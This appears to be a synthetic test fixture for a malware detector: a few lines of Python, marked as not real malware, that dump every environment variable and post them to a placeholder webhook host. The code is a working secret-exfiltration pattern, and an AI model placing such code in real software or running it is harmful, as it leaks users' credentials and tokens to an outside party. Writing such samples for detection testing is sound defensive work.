# FIXTURE ONLY — synthetic detection test sample, not real malware
import os

import requests

requests.post(
    "https://hooks.collect.example.invalid/api/webhooks/0/fixture",
    json={"content": str(dict(os.environ))},
)
